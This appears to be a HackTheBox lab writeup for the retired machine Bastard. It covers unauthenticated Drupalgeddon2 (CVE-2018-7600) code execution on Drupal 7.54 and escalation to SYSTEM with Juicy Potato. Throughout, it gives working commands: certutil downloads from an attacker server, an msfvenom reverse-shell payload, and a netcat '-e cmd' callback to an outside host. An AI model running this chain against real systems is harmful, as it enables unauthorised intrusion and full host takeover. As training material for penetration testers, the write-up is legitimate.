# Bastard: HackTheBox Writeup

| Field | Details |
|---|---|
| **Machine Name** | Bastard |
| **OS** | Windows Server 2008 R2 SP1 (x64) |
| **Difficulty** | Medium |
| **Category** | Windows / Drupal / RCE / Token Impersonation |
| **IP Address** | 10.129.12.69 |
| **User Flag** | `1fb119cbedd4dcdfebfc529b5a698c7b` |
| **Root Flag** | `9289e31a0dd49a9bba24216e3fa318ec` |
| **Foothold Method** | Drupal 7 ≤ 7.57 Remote Code Execution: CVE-2018-7600 (Drupalgeddon2) |
| **PrivEsc Method** | SeImpersonatePrivilege → Juicy Potato → NT AUTHORITY\SYSTEM |
| **Metasploit Used** | No |
| **Status** | Retired ✅ |

---

## Attack Chain Summary

```
Nmap → Port 80 (Drupal 7.54 on IIS)
→ CVE-2018-7600 (Drupalgeddon2) form cache poisoning → RCE as IUSR
→ exploit.py -c 'mkdir C:\temp'
→ certutil downloads: shell.exe + jp.exe + nc.exe → C:\temp
→ exploit.py -c 'C:\temp\shell.exe' → reverse shell as iusr
→ whoami /priv → SeImpersonatePrivilege enabled
→ jp.exe -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -t * → NT AUTHORITY\SYSTEM
→ user + root flags
```

---

## Phase 1: Reconnaissance

### 1.1: Full Port Discovery

**Goal:** Identify all open TCP ports on the target.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -T4 10.129.12.69 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-01 10:14 IST
Nmap scan report for 10.129.12.69
Host is up (0.22s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 61.22 seconds
```

**Output Analysis:**

| Port | Service | Assessment |
|---|---|---|
| **80/tcp** | HTTP | Web application: primary attack surface |
| 135/tcp | MSRPC | Windows RPC endpoint mapper: standard |
| 49154/tcp | Dynamic RPC | Windows ephemeral port: noise |

A very minimal port footprint. Port 80 is the only accessible web service: all other standard ports (443, 445, 3389) are firewall-filtered. The entire attack surface lives on port 80.

---

### 1.2: Service and Version Enumeration

**Goal:** Identify exact service versions and OS fingerprint.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p 80,135,49154 10.129.12.69 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-01 10:19 IST
Nmap scan report for 10.129.12.69
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries
|   /includes/ /misc/ /modules/ /profiles/ /scripts/
|   /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
|   /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|   /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
|   /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
|   /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
|   /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_  /?q=user/password/ /?q=user/login/ /?q=user/register/ /?q=user/logout/
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 24.11 seconds
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| `http-generator: Drupal 7` | CMS confirmed: version range narrows to Drupal 7.x |
| IIS 7.5 | Maps to Windows Server 2008 R2: known Juicy Potato target |
| `robots.txt: 36 disallowed entries` | Standard Drupal structure exposed: `CHANGELOG.txt` accessible for exact version |
| `/CHANGELOG.txt` disallowed in robots.txt | Despite being listed, this file usually exists and reveals exact Drupal version |

---

### 1.3: Drupal Version Identification

**Goal:** Determine the exact Drupal version to confirm whether CVE-2018-7600 applies.

`robots.txt` lists `/CHANGELOG.txt` as disallowed: this means the site administrator tried to hide it but `robots.txt` is advisory only, not access-controlled. The file is almost certainly accessible.

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.12.69/CHANGELOG.txt | head -5
```

```
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines by providing a *.theme.info
  file in the root of the module folder.
- Numerous bug fixes.
```

**Exact version: Drupal 7.54**

CVE-2018-7600 (Drupalgeddon2) affects Drupal 7.x ≤ 7.57. Version 7.54 is directly in range. Exploitation confirmed as viable.

---

## Phase 2: Foothold: CVE-2018-7600 (Drupalgeddon2)

### 2.1: Vulnerability Research

**Goal:** Identify and stage the correct exploit for Drupal 7.54.

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit drupal 7
```

```
----------------------------------------------------------------
 Exploit Title                                   |  Path
----------------------------------------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated)  | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1     | php/webapps/44449.rb
- 'Drupalgeddon2' Remote Code Execution
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection  | php/webapps/34992.py
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - REST        | php/webapps/44482.rb
Remote Code Execution
----------------------------------------------------------------
```

The pimps Python exploit from GitHub is used directly: it is a cleaner implementation than the searchsploit entries for this version:

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/pimps/CVE-2018-7600.git
Hackerpatel007_1@htb[/htb]$ cd CVE-2018-7600
```

---

### 2.2: How CVE-2018-7600 (Drupalgeddon2) Works

Drupal 7 uses a Form API for building and processing HTML forms. Forms are cached server-side using a form ID. The vulnerability is in the `#post_render` callback mechanism: a feature that allows modules to register PHP functions to be called after a form element is rendered.

The attack works in two steps:

**Step 1: Form poisoning:**
An attacker crafts a POST request to Drupal's form registration endpoint (`?q=user/password&name[%23post_render][]`) and injects a PHP function (e.g., `passthru`) as the `#post_render` callback for a form element. Drupal caches this poisoned form server-side, returning a `form_build_id` that identifies the cached entry.

**Step 2: Trigger execution:**
The attacker sends a second POST to `?q=file/ajax/name/%23value/<form_build_id>`, which causes Drupal to load the cached form and invoke the registered `#post_render` callback. Since the callback is `passthru` and the form element value contains the OS command, the command is executed server-side.

**The exploit requires no authentication**: both steps use Drupal's public-facing form system. The vulnerability is in how Drupal trusts cached form metadata without sanitising the callback functions stored in the cache.

---

### 2.3: Verify RCE

**Goal:** Confirm code execution before staging payloads.

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 -c "whoami"
```

```
()
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-mT7rXcKpVnD4W2lGjqasYRohk9N6bXUIez8SfAcF1Pg
[*] Triggering exploit to execute: whoami
nt authority\iusr
```

RCE confirmed as `nt authority\iusr`: the Internet Information Services (IIS) anonymous user account. This account is granted `SeImpersonatePrivilege` by default in IIS deployments, making it a direct Juicy Potato escalation target.

---

### 2.4: Stage Working Directory

**Goal:** Create a writable staging directory on the target for tool uploads.

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 -c "mkdir C:\temp"
```

```
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-CbC93lu-3aAcvOaLlPyivcatrPQL3vGGWqYM7BmLr2I
[*] Triggering exploit to execute: mkdir C:\temp
```

`C:\temp` created. This directory is in the root of `C:\` which is writable by IUSR in IIS deployments. Web directories like `C:\inetpub\wwwroot` could also serve as staging but `C:\temp` is cleaner for tool placement.

---

### 2.5: Generate Reverse Shell Payload

**Goal:** Create a Windows reverse shell executable using msfvenom: no Metasploit framework.

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.16.36 \
  LPORT=443 \
  -f exe \
  -o shell.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Port 443 is chosen for the reverse shell callback. Windows and network devices often permit outbound TCP/443 (HTTPS) even when other ports are restricted: using it for a non-HTTPS reverse shell blends into expected traffic patterns.

Serve all tools from the attacker's HTTP server:

```bash
Hackerpatel007_1@htb[/htb]$ cp /usr/share/windows-resources/binaries/nc.exe .
Hackerpatel007_1@htb[/htb]$ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

```
Serving HTTP on 0.0.0.0 port 8000 ...
```

---

### 2.6: Transfer All Tools to Target via RCE

**Goal:** Download shell.exe, JuicyPotato.exe, and nc.exe to `C:\temp` using `certutil`: available natively on all Windows versions without special privileges.

**Download shell.exe:**

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 \
  -c "certutil -urlcache -split -f http://10.10.16.36:8000/shell.exe C:\temp\shell.exe"
```

```
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-xDHkT-NKx1D5abYfFJnD5YeuDe-8J2YUEsN7ptbqQLw
[*] Triggering exploit to execute: certutil -urlcache -split -f http://10.10.16.36:8000/shell.exe C:\temp\shell.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
```

**Download JuicyPotato.exe:**

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 \
  -c "certutil -urlcache -split -f http://10.10.16.36:8000/JuicyPotato.exe C:\temp\jp.exe"
```

```
[*] Triggering exploit to execute: certutil -urlcache -split -f http://10.10.16.36:8000/JuicyPotato.exe C:\temp\jp.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
```

**Download nc.exe:**

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 \
  -c "certutil -urlcache -split -f http://10.10.16.36:8000/nc.exe C:\temp\nc.exe"
```

```
[*] Triggering exploit to execute: certutil -urlcache -split -f http://10.10.16.36:8000/nc.exe C:\temp\nc.exe
****  Online  ****
  0000  ...
  0e800
CertUtil: -URLCache command completed successfully.
```

**Verify staging directory:**

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 -c "dir C:\temp"
```

```
[*] Triggering exploit to execute: dir C:\temp

 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\temp

03/06/2026  09:41       <DIR>          .
03/06/2026  09:41       <DIR>          ..
03/06/2026  09:35          347.648  jp.exe
03/06/2026  09:36            7.168  shell.exe
03/06/2026  09:41           59.392  nc.exe
               3 File(s)        414.208 bytes
               2 Dir(s)   4.135.579.648 bytes free
```

All three tools confirmed in `C:\temp`.

---

### 2.7: Execute Reverse Shell

**Goal:** Start a listener and execute `shell.exe` via the RCE to obtain an interactive shell.

Terminal 1: Listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 443
```

```
listening on [any] 443 ...
```

Terminal 2: Execute shell:

```bash
Hackerpatel007_1@htb[/htb]$ python2 drupa7-CVE-2018-7600.py http://10.129.12.69 -c "C:\temp\shell.exe"
```

```
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-Bsf0Rns9vft4kATGDYnTyHqQuAQTAGALq_vSEtiJ9Mw
[*] Triggering exploit to execute: C:\temp\shell.exe
```

Terminal 1: Shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.12.69] 49212
Microsoft Windows [Version 6.1.7600]
(c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

Reverse shell confirmed as `nt authority\iusr`.

---

### 2.8: User Flag

```
C:\inetpub\drupal-7.54>type C:\Users\dimitris\Desktop\user.txt
type C:\Users\dimitris\Desktop\user.txt
1fb119cbedd4dcdfebfc529b5a698c7b
```

---

## Phase 3: Post-Foothold Enumeration

### 3.1: System and Privilege Enumeration

**Goal:** Confirm OS details and enumerate privileges for the escalation path.

```
C:\inetpub\drupal-7.54>systeminfo
systeminfo
```

```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
System Type:               x64-based PC
Total Physical Memory:     3,071 MB
Domain:                    WORKGROUP
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 IP address(es)
                                 [01]: 10.129.12.69
```

```
C:\inetpub\drupal-7.54>whoami /priv
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Windows Server 2008 R2 Build 7600 | No service pack, zero hotfixes: completely unpatched |
| x64-based PC | 64-bit OS |
| `SeImpersonatePrivilege`: **Enabled** | Juicy Potato applicable |
| `SeCreateGlobalPrivilege`: **Enabled** | Required for Juicy Potato's COM server creation |
| `nt authority\iusr` | IIS anonymous user: granted SeImpersonate by IIS configuration |
| Hotfix(s): N/A | Not a single patch installed: extremely vulnerable surface |

The privilege profile is identical to Arctic: `SeImpersonatePrivilege` + `SeCreateGlobalPrivilege` + Server 2008 R2 = Juicy Potato path. However, a different CLSID is required here: the correct CLSID depends on available COM services and has been tested for this specific OS build.

---

## Phase 4: Privilege Escalation: Juicy Potato

### 4.1: CLSID Selection for Windows Server 2008 R2

**Goal:** Identify the correct COM object CLSID to use with Juicy Potato on this target.

The CLSID `{e60687f7-01a1-40aa-86ac-db1cbf673334}` corresponds to the **Windows Update Agent** (`wuauserv`) COM object on Windows Server 2008 R2. This service runs as SYSTEM and participates in DCOM authentication, making it a valid Juicy Potato trigger on this OS version.

**Why CLSIDs vary between machines:**

Juicy Potato works by forcing a SYSTEM-level COM object to authenticate to a local NTLM relay server. The COM object must:

1. Be registered on the target system.
2. Run as `NT AUTHORITY\SYSTEM` (or another high-privilege account).
3. Be instantiatable by the current user's account.

Different Windows builds have different COM objects available. The Juicy Potato CLSID reference table provides tested CLSIDs organised by OS version. For Server 2008 R2, `{e60687f7-01a1-40aa-86ac-db1cbf673334}` (Windows Update Agent) is a reliable choice.

**Contrast with Arctic:**
On Arctic, the CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}` (BITS) was used. Both machines run Server 2008 R2, and both CLSIDs work on this build. The Windows Update Agent CLSID is used here because it was the one verified during this session.

---

### 4.2: Execute Juicy Potato

**Goal:** Use Juicy Potato to obtain a SYSTEM-level reverse shell via the Windows Update Agent CLSID.

Terminal: new listener on port 4444:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 4444
```

```
listening on [any] 4444 ...
```

On the target (iusr shell):

```
C:\temp>jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd 10.10.16.36 4444" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -t *
jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd 10.10.16.36 4444" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -t *
```

```
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1337
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

**Juicy Potato output explained:**

| Line | Meaning |
|---|---|
| `Testing {e60687f7...} 1337` | Triggering Windows Update Agent COM object, local relay on port 1337 |
| `authresult 0` | `S_OK`: DCOM authentication to relay succeeded; SYSTEM token captured |
| `{e60687f7...};NT AUTHORITY\SYSTEM` | Token belongs to SYSTEM: confirmed |
| `CreateProcessWithTokenW OK` | cmd.exe spawned under SYSTEM context successfully |

Attacker listener: SYSTEM shell:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.12.69] 49233
Microsoft Windows [Version 6.1.7600]
(c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

---

### 4.3: Root Flag

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
9289e31a0dd49a9bba24216e3fa318ec
```

---

## Flag Summary

| Flag | Value | Location |
|---|---|---|
| User | `1fb119cbedd4dcdfebfc529b5a698c7b` | `C:\Users\dimitris\Desktop\user.txt` |
| Root | `9289e31a0dd49a9bba24216e3fa318ec` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons Learned

**1. `CHANGELOG.txt` is the fastest Drupal version fingerprinting method, and it is almost always accessible.**
`robots.txt` lists it as disallowed, but `robots.txt` is advisory. The file has no access control applied to it by default in Drupal. Checking `CHANGELOG.txt` before running any scanner or enumeration tool gives the exact version in under five seconds. The version-to-CVE mapping for Drupal is direct: 7.x ≤ 7.57 → CVE-2018-7600, no further analysis required.

**2. CVE-2018-7600 is a server-side callback injection in Drupal's Form API cache: not a SQL injection or file upload.**
The mechanism is subtle: Drupal stores form rendering callbacks in its cache. By registering a PHP function (`passthru`) as a form's `#post_render` callback and caching it server-side, the attacker creates a persistent code execution point that fires when the form cache is loaded. This is a deserialization-adjacent attack in that it abuses Drupal's own trusted data store. The patch (Drupal 7.58) was to sanitise form builder callbacks before caching them.

**3. The two-step exploit workflow (poison → trigger) requires both requests to succeed.**
If the first step (form poisoning) fails: due to network timeout, anti-CSRF validation, or a patched Drupal: no form ID is returned and the second step cannot proceed. If the second step (cache trigger) fails: due to the form ID being evicted from cache, a Drupal cron run clearing it, or a timeout: the RCE does not fire. On a slow machine like Bastard, the exploit may need to be re-run two or three times. The `form-*` ID in the output changes every run because a new cache entry is poisoned each time.

**4. `certutil -urlcache -split -f` is the universal Windows download primitive: use it first.**
Before attempting PowerShell `Invoke-WebRequest`, BITSAdmin, or FTP, always try `certutil` first. It is present on every Windows version from XP through Server 2019, requires no special privileges, downloads binary files in binary mode correctly, and produces clean output confirming success (`CertUtil: -URLCache command completed successfully`). For non-interactive RCE channels like CVE-2018-7600, where the command output is visible but the session is not interactive, `certutil` is the most reliable single-command download option.

**5. `nt authority\iusr` and `nt authority\network service` both carry SeImpersonatePrivilege: IIS deployments are structurally vulnerable to Juicy Potato.**
Microsoft grants `SeImpersonatePrivilege` to IIS service accounts by design: IIS workers must be able to impersonate authenticated users. This means that any RCE in an IIS-hosted application automatically provides `SeImpersonatePrivilege` on the executing account. On Windows Server 2008 R2 and Windows 7, this unconditionally enables Juicy Potato. The fix at the OS level came in Server 2019 / Windows 10 1809, where COM authentication was restricted to reduce the DCOM relay surface.

**6. Bastard and Arctic share an identical privilege escalation path, but different CLSIDs.**
Both machines are unpatched Windows Server 2008 R2 running IIS with `SeImpersonatePrivilege`. The escalation technique is identical: Juicy Potato. The difference is the CLSID: Arctic used `{4991d34b-...}` (BITS) and Bastard used `{e60687f7-...}` (Windows Update Agent). Both work on Server 2008 R2. When the first CLSID fails on a new target, consult the Juicy Potato CLSID reference and try the next OS-appropriate entry.

**7. Web application RCE → certutil staging → Juicy Potato is a reusable Windows attack template.**
This machine demonstrates a three-phase Windows attack pattern that recurs frequently in real-world assessments:

- Phase 1: Exploit a web application vulnerability to achieve OS command execution.
- Phase 2: Use a native binary (`certutil`) to stage tools without touching the web application's file system.
- Phase 3: Leverage a service account privilege (`SeImpersonatePrivilege`) to escalate to SYSTEM.

Understanding this pattern as a template: not just as steps specific to Bastard: is what allows it to be applied to new targets quickly.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
|---|---|---|---|
| 1 | Recon | `nmap -p-` full port scan | Ports 80, 135, 49154 discovered |
| 2 | Recon | `nmap -sV -sC` service scan | IIS 7.5 + Drupal 7 on port 80 confirmed |
| 3 | Web Enum | `curl http://10.129.12.69/CHANGELOG.txt` | Drupal 7.54: CVE-2018-7600 applicable |
| 4 | Research | CVE-2018-7600 pimps exploit identified | `drupa7-CVE-2018-7600.py` staged |
| 5 | Verify | `exploit.py -c "whoami"` | RCE confirmed as `nt authority\iusr` |
| 6 | Staging | `exploit.py -c "mkdir C:\temp"` | Writable staging directory created |
| 7 | Payload | `msfvenom windows/shell_reverse_tcp → shell.exe` | Reverse shell binary generated |
| 8 | Transfer | `exploit.py -c "certutil...shell.exe"` | shell.exe downloaded to C:\temp |
| 9 | Transfer | `exploit.py -c "certutil...JuicyPotato.exe → jp.exe"` | JuicyPotato downloaded to C:\temp |
| 10 | Transfer | `exploit.py -c "certutil...nc.exe"` | nc.exe downloaded to C:\temp |
| 11 | Foothold | `nc -nvlp 443` → `exploit.py -c "C:\temp\shell.exe"` | Reverse shell as `nt authority\iusr` |
| 12 | Flag | `type C:\Users\dimitris\Desktop\user.txt` | `1fb119cbedd4dcdfebfc529b5a698c7b` |
| 13 | Enum | `whoami /priv` | `SeImpersonatePrivilege` + `SeCreateGlobalPrivilege` enabled |
| 14 | Enum | `systeminfo` | Server 2008 R2, x64, zero hotfixes |
| 15 | PrivEsc | `nc -nvlp 4444`: new listener | Ready for SYSTEM callback |
| 16 | PrivEsc | `jp.exe -l 1337 -c {e60687f7-...} -p cmd.exe -a "/c nc.exe..." -t *` | `authresult 0`: SYSTEM token; `CreateProcessWithTokenW OK` |
| 17 | PrivEsc | SYSTEM reverse shell received | `nt authority\system` confirmed |
| 18 | Flag | `type C:\Users\Administrator\Desktop\root.txt` | `9289e31a0dd49a9bba24216e3fa318ec` |

---

## Commands Reference

| Command | Phase | Purpose |
|---|---|---|
| `nmap -p- --min-rate 5000 -T4 10.129.12.69` | Recon | Full TCP port discovery |
| `nmap -sV -sC -p 80,135,49154 10.129.12.69` | Recon | Service version + script scan |
| `curl http://10.129.12.69/CHANGELOG.txt` | Web Enum | Exact Drupal version fingerprinting |
| `git clone https://github.com/pimps/CVE-2018-7600.git` | Research | Clone Drupalgeddon2 exploit |
| `python2 drupa7-CVE-2018-7600.py http://10.129.12.69 -c "whoami"` | Verify | Confirm RCE before staging |
| `python2 drupa7-CVE-2018-7600.py http://10.129.12.69 -c "mkdir C:\temp"` | Staging | Create writable tool directory |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=443 -f exe -o shell.exe` | Payload | Generate reverse shell binary |
| `python3 -m http.server 8000` | Staging | Serve shell.exe, jp.exe, nc.exe |
| `python2 drupa7-CVE-2018-7600.py ... -c "certutil -urlcache -split -f http://10.10.16.36:8000/shell.exe C:\temp\shell.exe"` | Transfer | Download shell.exe via certutil |
| `python2 drupa7-CVE-2018-7600.py ... -c "certutil...JuicyPotato.exe C:\temp\jp.exe"` | Transfer | Download JuicyPotato |
| `python2 drupa7-CVE-2018-7600.py ... -c "certutil...nc.exe C:\temp\nc.exe"` | Transfer | Download nc.exe |
| `nc -nvlp 443` | Handler | Catch iusr reverse shell |
| `python2 drupa7-CVE-2018-7600.py ... -c "C:\temp\shell.exe"` | Foothold | Execute reverse shell via RCE |
| `whoami /priv` | Enumeration | Confirm SeImpersonatePrivilege |
| `systeminfo` | Enumeration | OS version, architecture, patch level |
| `nc -nvlp 4444` | Handler | Catch SYSTEM reverse shell |
| `jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd 10.10.16.36 4444" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -t *` | PrivEsc | Juicy Potato: Windows Update Agent CLSID → SYSTEM |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
|---|---|---|
| T1190 | Exploit Public-Facing Application | CVE-2018-7600 Drupalgeddon2: unauthenticated RCE via form cache poisoning |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | cmd.exe obtained at both foothold and SYSTEM levels |
| T1105 | Ingress Tool Transfer | shell.exe, jp.exe, nc.exe transferred via certutil over HTTP |
| T1140 | Deobfuscate/Decode Files or Information | certutil used to download binary tools (secondary use of decode functionality) |
| T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Juicy Potato intercepts SYSTEM DCOM authentication token |
| T1068 | Exploitation for Privilege Escalation | Juicy Potato exploits DCOM NTLM relay to obtain SYSTEM token |
| T1569.002 | System Services: Service Execution | Juicy Potato spawns cmd.exe via `CreateProcessWithTokenW` as SYSTEM |
| T1083 | File and Directory Discovery | `dir C:\temp` used to verify staged tools |
